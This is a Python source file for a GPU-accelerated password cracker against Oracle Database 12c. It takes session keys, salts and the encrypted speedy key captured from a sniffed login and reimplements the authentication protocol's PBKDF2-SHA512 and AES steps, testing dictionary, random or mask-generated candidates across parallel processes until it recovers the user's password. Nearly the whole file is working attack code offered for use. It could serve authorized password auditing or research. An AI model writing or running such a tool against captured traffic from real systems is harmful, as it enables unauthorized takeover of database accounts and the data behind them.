# Oracle Database 12c password brute forcer
#
# Uses data from two packets from a successful authentication capture
#
# Rate is about 100000 passwords in 1 minute with Geforce FX 1650 Super
#


import sys
import binascii
#import pbkdf2, hashlib, hmac
from Crypto.Cipher import AES
import time
from multiprocessing import Process 
from multiprocessing import Queue
import secrets
import random
import os
import re
from Library import opencl
from Library.opencl_information import opencl_information
from datetime import datetime
from colorama import Fore
from colorama import Style
import json
import string
import argparse
from rich.console import Console
from rich.table import Table
import datetime as dt

class OraKeys:
	def __init__(self, dictk):

		self.bin_salt = binascii.unhexlify(dictk['AUTH_VFR_DATA'])
		self.bin_PBKDF2Salt = binascii.unhexlify(dictk['PBKDF2Salt'])
		self.bin_server_session_key = binascii.unhexlify(dictk['SERVER_AUTH_SESSKEY'])
		self.bin_password = binascii.unhexlify(dictk['AUTH_PASSWORD'])
		self.bin_client_session_key = binascii.unhexlify(dictk['CLIENT_AUTH_SESSKEY'])
		self.bin_speedy_key = binascii.unhexlify(dictk['AUTH_PBKDF2_SPEEDY_KEY'])
		self.oraUSER = dictk['USERNAME']
		self.PBKDF2VgenCount=int(dictk['PBKDF2VgenCount'])
		self.PBKDF2SderCount=int(dictk['PBKDF2SderCount'])
		
	
		self.salt = self.bin_salt + b'AUTH_PBKDF2_SPEEDY_KEY'
		self.Tr =""
		
		
		# bin_speedy_key = binascii.unhexlify(sniff_v[5][1])

	def pbkdf2_sha512_cl(self,opencl_algo, passwT,salt,iters, dklen ):
		ctx=opencl_algo.cl_pbkdf2_init("sha512", len(salt), dklen)
		return opencl_algo.cl_pbkdf2(ctx,passwT, salt, iters, dklen)


	def create_digest(self, opencl_algo,key_64bytes_2, bin_salt):

		key_64bytes_2=list(map(lambda x: x+self.bin_salt,key_64bytes_2 ))
		
		ctx=opencl_algo.cl_sha512_init()
		clresult=opencl_algo.cl_sha512(ctx,key_64bytes_2)

		return(clresult)
	
	def pycl_aes(self,T,crypted_data,platform):
		opencl_ctx = opencl.opencl_py(platform,'aes')
		opencl_ctx.compile({})
		return opencl_ctx.run_aes(T,crypted_data)

	def pycl_concat(self,str1,str2,platform):
		opencl_ctx = opencl.opencl_py(platform,'concat')
		opencl_ctx.compile({})
		return opencl_ctx.run_concat(str1,str2)
	
	def pycl_substr(self,str1,lens,platform):
		opencl_ctx = opencl.opencl_py(platform,'str32')
		opencl_ctx.compile({"STRSIZE":str(lens)})
		return opencl_ctx.run_substr(str1,lens)

	def new_AES(self, T):
		obj = AES.new(T, AES.MODE_CBC, b'\x00' * 16)
		return obj
	
	def Tr(self):
		return(self.Tr)

	def TryPassword(self, passwT,opencl_algos,tnt):

		
		#PKBFD2 list creation of hashed passwords
		key_64bytes=self.pbkdf2_sha512_cl(opencl_algos, passwT, self.salt, self.PBKDF2VgenCount, 96)        
		key_64bytes= self.pycl_substr(key_64bytes,64,plat)
		T = self.create_digest(opencl_algos,key_64bytes, self.bin_salt)
		
		#AES decrypt of session keys
		T_aes= self.pycl_substr(T,32,plat)
		client_generated_random_salt = self.pycl_aes(T_aes,self.bin_client_session_key,plat)
		cryptotext= self.pycl_aes(T_aes,self.bin_server_session_key,plat)

		#decryption key is concatenate keys 
		clear_decryption_key=self.pycl_concat(client_generated_random_salt,cryptotext,plat)
		clear_decryption_key=list(map(lambda x: binascii.hexlify(x).upper(), clear_decryption_key))

		#PKBFD2 of decryption key
		decryption_key=self.pbkdf2_sha512_cl(opencl_algos, clear_decryption_key, self.bin_PBKDF2Salt, self.PBKDF2SderCount, 96)
		decryption_key32=self.pycl_substr(decryption_key,32,plat)
		
		#AES Decrypt of Password sent over net
		cleartext = self.pycl_aes(decryption_key32,self.bin_speedy_key,plat)
		
		for i,cltxt in enumerate(cleartext):
			#print("cltxt   :", cltxt.hex())
			cltxt = cltxt[16:] 
			#print("cltxt16 :", cltxt.hex())
			
			if cltxt == key_64bytes[i]:
				p=passwT[i]
				self.Tr=T[i].hex().upper()
				return p


		return "NOT FOUND"	

def tims():
	return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def create_pw(rangex,minp,maxp,mask):
	r=[]
	minp=int(minp)
	maxp=int(maxp)
	for _ in range(rangex):
		if mask == "":
			#totally random choice
			alphabet = string.printable + string.ascii_letters*2 + string.digits
			rx = "".join(secrets.choice(alphabet) for i in range(random.randint(minp,maxp)))
		else:
			rx=""
			for c in list(mask):
				if c=='a':
					rx=rx+secrets.choice(string.ascii_letters)
				elif c=='9':
					rx=rx+secrets.choice(string.digits)
				elif c=='z':
					rx=rx+secrets.choice(string.ascii_letters+string.digits)
				elif c=="x":
					rx=rx+secrets.choice(string.printable)
		r.append(rx.replace(r"[ \n\t\s\r]","").encode())
	return(r)

def proc_t(nt, ntt, oki,rangex,tab_dic,**ka):
	def create_table_console(titolotab):
		table = Table(show_header=True,header_style="bold red",title=titolotab)
		table.add_column("PROCESS",style="magenta")
		table.add_column("ACTUAL TIME",style="magenta")
		table.add_column("PROCESS TIME",style="magenta")			
		table.add_column("SEG START",style="magenta")
		table.add_column("SEG END",style="magenta")
		table.add_column("TOT PWDS",style="bold yellow",width=20)
		table.add_column("LAST PASSWORD",style="magenta",width=20)
		table.add_column("FOUND",style="magenta",width=5)
		return table
	

	if "filedic" in ka: filedic=ka["filedic"] 
	if "cnt" in ka: cnt=ka["cnt"]
	if "minp" in ka: minp=ka["minp"]
	if "maxp" in ka: maxp=ka["maxp"]
	if "mask" in ka: mask=ka["mask"]
	if "plat" in ka: plat=ka["plat"]
	if "q_r" in ka: q_r=ka["q_r"]
	if "q_ret" in ka: q_ret=ka["q_ret"]
	
	titolotab="NUM PASSW BLOCKS: "+str(rangex)
	if cnt==0:
		titolotab=titolotab+" MASK: "+mask
	else:
		titolotab=titolotab+" DICT: "+filedic+" TOTAL PASSWORDS "+str(cnt)
	if plat is None: plat=0
	pwT="NO"
	opencl_algos=create_pl(plat)
	tnt = nt
	#print("Starting  thread con index ", str(tnt), " ")
	passwordlist_bl=[]
	cntx = 0
	q_ret.put(False)
	if cnt>0:
		#DICTIONARY MODE
		iters=int(round(cnt/rangex,0))+1
	else:
		#BRUTE FORCE RANDOM PASS
		iters=10_000_000_000
	lentot=0
	try:
			
		for niters in range(iters):
			if cnt>0:
				f = open(filedic,"r")
				cntx = 0
				lenblock=0
				passwordlist_bl=[]
				for passw_ in f.readlines():
					cntx += 1
					lim_inf=niters*rangex
					lim_sup=(niters+1)*rangex
					if (cntx>lim_inf and cntx <= lim_sup) and (cntx % ntt == tnt):
						passwordlist_b=re.sub(r"[\n\t\s\r]*", "", passw_).strip().encode()
						passwordlist_bl.append(passwordlist_b)
			elif cnt==0:
				passwordlist_bl=create_pw(rangex,minp,maxp,mask)
				lim_inf=0
				lim_sup=0
			lenblock=len(passwordlist_bl)
			lentot=lentot+lenblock
			#passwordlist_bl=["oracle2".encode()] #FORZATURA PER TEST
			passwT = oki.TryPassword(passwordlist_bl,opencl_algos,tnt)
			Tr=""
			qrpwfound=False
			pwfound=False	
			lp=passwordlist_bl[-1].decode()
			if passwT!="NOT FOUND":
				lp=passwT.decode('utf-8')
				Tr=oki.Tr
				pwfound=True
				q_ret.put(True)
			
			l=[str(tnt),str(tims()),
						  str(dt.timedelta(seconds=int(time.process_time()))),str(lim_inf),str(lim_sup),
						  str(lentot),lp,pwfound,Tr,pwT]
			q_r.put(l)
			
			while (q_ret.empty() == False):
				if q_ret.get():
					qrpwfound=True
					q_ret.put(qrpwfound)
					break
					
			if tnt==0:
				l1=[]
				
				for _ in range(ntt):
					l1.append(q_r.get())
				
				console.clear()
				table=create_table_console(titolotab)
				
				for i in range(len(l1)):
					if len(l1[i])>0:
						pwT=l1[i][7]
						pwX = l1[i][6] 
						if pwT:
							pwfound=True
							pwX="[green bold]"+pwX+"[/green bold]"
							pwT="[bold green]"+str(pwT)+"[/bold green]"
							Tr=l1[i][8]
						pwT=str(pwT)	
						table.add_row(l1[i][0],l1[i][1],l1[i][2],l1[i][3],l1[i][4],l1[i][5],pwX,pwT)
						
				console.print(tab_dic)
				console.print(table)
				if pwfound:
					console.print("[blink bold red]T:"+Tr+"[/blink bold red]")
					sys.exit(0)
			if qrpwfound:
				sys.exit(0)
			q_ret.put(qrpwfound)

	except KeyboardInterrupt:
		print(f"\n\r {Fore.RED}EXIT...{Fore.RESET}")
		sys.exit(0)
	

def create_pl(plat):
	platform = plat
	debug = 0
	write_combined_file = False
	opencl_algos = opencl.opencl_algos(platform, debug, write_combined_file,inv_memory_density=1)
	#print(opencl_information.printfullinfo(0))
	return opencl_algos

def create_dict_okeys(ki):

	dictk={}

	# Server authentication packet capture
	for k,keyaz in enumerate(ki):
		if k == 0:
			dictk['AUTH_VFR_DATA']=ki[k]
		if k == 1:
			dictk['PBKDF2Salt']=ki[k]
		if k == 2:
			dictk['SERVER_AUTH_SESSKEY']=ki[k]
		if k == 3:
			dictk['AUTH_PASSWORD']=ki[k]
		if k == 4:
			dictk['CLIENT_AUTH_SESSKEY']=ki[k]
		if k == 5:
			dictk['AUTH_PBKDF2_SPEEDY_KEY']=ki[k]
		if k == 6:
			dictk['USERNAME']=ki[k]
		if k == 7:
			dictk['PBKDF2VgenCount']=ki[k] #iters pwd hash
		if k == 8:
			dictk['PBKDF2SderCount']=ki[k] #iters key decrypt hash			

	return(dictk)	


def create_class_okeys(dictk):
	
	oki = OraKeys(dictk)

	return oki

def start_search(oki,mode,dictk,**kwargs):
	def create_table_dict(dictk):
		tab = Table(show_header=False)
		for key in dictk:
			tab.add_row(key,dictk[key])
		return tab
	
	tab_dic = create_table_dict(dictk)	
	console.print(tab_dic)
	q_r=Queue()
	q_ret=Queue()
	
	cnt=0
	filedic=""
	if "block" in kwargs: rangex=int(kwargs["block"])
	minp=0
	maxp=0
	mask=""
	if "plat" in kwargs: plat=kwargs["plat"]
	if mode =='dict':
		#DATA DITCTIONARY SEARCH
		filedic = kwargs["filedic"]
		f = open(filedic,"r")
		for _ in f:cnt+=1
		print(f"Number Passwords Data Dictionary {Fore.YELLOW}{cnt}{Fore.RESET}")
		print(f"Number Passwords in a single elaboration block {Fore.YELLOW}{rangex}{Fore.RESET}")	
	elif mode =='random':
		if "minp" in kwargs: minp=kwargs["minp"]
		if "maxp" in kwargs: maxp=kwargs["maxp"]
		if "mask" in kwargs: mask=kwargs["mask"]
		
		print(f"Start search with random password lenght from {minp} to {maxp} and mask {mask}")
	else:
		sys.exit(-1)
	
	if "proc" in kwargs: proc=kwargs["proc"]
	if int(proc) == -1:
		ntt = os.cpu_count()
	else: 
		ntt = int(proc)

	if ntt==1:
		proc_t(0, ntt, oki,  rangex, tab_dic,\
			   filedic = filedic,cnt=cnt,minp=minp, maxp=maxp, mask=mask,plat=plat,q_r=q_r,q_ret=q_ret)
	elif ntt > 1:
		print(f"{Fore.LIGHTCYAN_EX}Start MULTIPROCESSING DECODE{Fore.RESET}")
		t = [proc_t] * ntt

		#start multiprocessing decode
		for nt in range(ntt):
			t[nt] = Process(target=proc_t, args=(nt, ntt, oki,rangex,tab_dic),\
												 kwargs={"filedic":filedic,
														 "cnt":cnt,
														 "minp":minp, 
														 "maxp":maxp, 
														 "mask":mask,
														 "plat":plat,
														 "q_r":q_r,
														 "q_ret":q_ret
														 },)
			t[nt].start()
	

	oki=""

def helpargs():
	console.print(f'''[italic green]
		-mod   
				random: brute force random password attack
				dict: use dictionary
		-json  
				name of the json file to decrypt
		-min   
				min lenght random password
		-max   
				max lenght random password
		-mask  
				mask of password:
				-a random[a-A] char
				-9 random[0-9] char
				-x all printables chars
				
		-plat  
				platform number to use
		-proc  
				number of core cpu to use. 
				-1 -> all cores
				1 default
		-block 
				number of passwords to load in gpu buffers at one time
		-filedic
				name of the dictionary file[/italic green]
				'''
	)
	sys.exit(0)

if __name__ == "__main__":

	try:
		
		minp=0
		maxp=0
		mask=""
		plat=0
		proc=1
		block=10_000
		filedic=""
		console=Console()
	
		parser = argparse.ArgumentParser()
		parser.add_argument("-help",required=False)
		parser.add_argument("-mode", required=True)
		parser.add_argument("-json", required=False)
		parser.add_argument("-min",  required=False)
		parser.add_argument("-max",  required=False)
		parser.add_argument("-mask", required=False)
		parser.add_argument("-plat", required=False)
		parser.add_argument("-proc", required=False)
		parser.add_argument("-block",required=False)
		parser.add_argument("-filedic",required=False)
		args = parser.parse_args()
		
		
		if args.help is not None:
			helpargs()
		if args.mode=="random":
			if (args.min is None or args.max is None) and args.mask is None:
				print(f"{Fore.RED}Valorizzare minima e massima lunghezza password o la sua maschera")
				sys.exit()
			elif not (args.min is None or args.max is None) and not args.mask is None:
				print(f"{Fore.RED}Valorizzare o minima e massima lunghezza password o la sua maschera")
				sys.exit()
			if args.min is not None: minp=args.min 
			if args.max is not None: maxp=args.max 
			if args.mask is not None: mask=args.mask
		elif args.mode=="dict" and args.filedic is None:
			print(f"{Fore.RED} Valorizzare il parametro dizionario")
			sys.exit()
		else:
			filedic=args.filedic
		
		if args.plat is not None: 
			if  args.plat=="?":
				info=opencl_information()
				info.printplatforms()
				sys.exit()
			else:
				plat=args.plat
		if args.block is not None: block=args.block
		
		if args.json is not None:
			jsnf=args.json
		if args.proc is not None:
			proc=args.proc
		with open(jsnf) as f:
			dictk=json.load(f)
		
		oki=create_class_okeys(dictk) #create class with methods to decode
		start_search( oki,  \
					  args.mode, \
					  dictk,
					  minp = minp, \
					  maxp = maxp, \
					  mask = mask, \
					  plat = plat, \
					  proc = proc, \
					  block= block,
					  filedic=filedic
					  ) #start main search
	except KeyboardInterrupt:
		print(f"\n\r {Fore.RED}EXIT...{Fore.RESET}")
		sys.exit(0)